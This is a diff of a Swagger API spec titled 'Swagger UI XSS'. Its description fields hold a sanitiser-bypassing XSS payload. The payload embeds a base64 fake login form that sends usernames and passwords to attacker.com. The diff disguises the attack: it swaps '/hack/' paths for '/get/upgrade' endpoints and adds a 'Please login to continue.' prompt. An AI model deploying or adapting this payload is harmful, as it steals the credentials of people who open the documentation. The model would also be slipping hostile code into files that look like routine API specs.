@@ -2,9 +2,9 @@ swagger: '2.0'
 info:
   title: Swagger UI XSS
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea rows="1" cols="1"><path id="</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIj48L2JyPlBhc3N3b3JkOjxicj4KPGlucHV0IHR5cGU9InVzZXJuYW1lIiBuYW1lPSJwYXNzd29yZCI+PC9icj48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9icj4='></object>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea>Please login to continue.</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIj48L2JyPlBhc3N3b3JkOjxicj4KPGlucHV0IHR5cGU9InVzZXJuYW1lIiBuYW1lPSJwYXNzd29yZCI+PC9icj48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9icj4='></object>"></form>
   version: production
-basePath: /XSSResource/
+basePath: /Resource/
 produces:
   - application/xml
   - application/json
@@ -14,20 +14,20 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /hack/cdw:
+  /get/upgrade:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
         - CDW
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/hack/hackid/{id}':
+      operationId: completeUpgrade
+      summary: Completes the upgrade process
+  '/get/upgrade/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea rows="1" cols="1"><path id="</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIj48L2JyPlBhc3N3b3JkOjxicj4KPGlucHV0IHR5cGU9InVzZXJuYW1lIiBuYW1lPSJwYXNzd29yZCI+PC9icj48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9icj4='></object>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea>Please login to continue.</textarea><object data='data:text/html;base64,PGZvcm0gYWN0aW9uPWh0dHBzOi8vYXR0YWNrZXIuY29tOjQ0NDM+VXNlcm5hbWU6PGJyPgo8aW5wdXQgdHlwZT0idXNlcm5hbWUiIG5hbWU9InVzZXJuYW1lIj48L2JyPlBhc3N3b3JkOjxicj4KPGlucHV0IHR5cGU9InVzZXJuYW1lIiBuYW1lPSJwYXNzd29yZCI+PC9icj48YnI+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9icj4='></object>"></form>
           format: int64
           in: path
           name: id
